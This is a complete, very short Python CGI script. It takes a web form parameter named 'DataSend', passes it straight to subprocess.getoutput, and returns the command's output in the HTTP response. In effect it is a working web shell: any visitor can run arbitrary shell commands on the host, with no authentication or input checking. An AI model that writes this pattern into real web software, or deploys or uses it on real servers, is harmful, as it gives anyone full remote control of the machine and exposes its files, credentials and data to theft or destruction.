#!/usr/bin/python3
import subprocess
import cgi
import os

print("content-type:   text/html")
print()
print()



data= cgi.FieldStorage()
cmd = data.getvalue("DataSend")

output=subprocess.getoutput(cmd)
print(output)
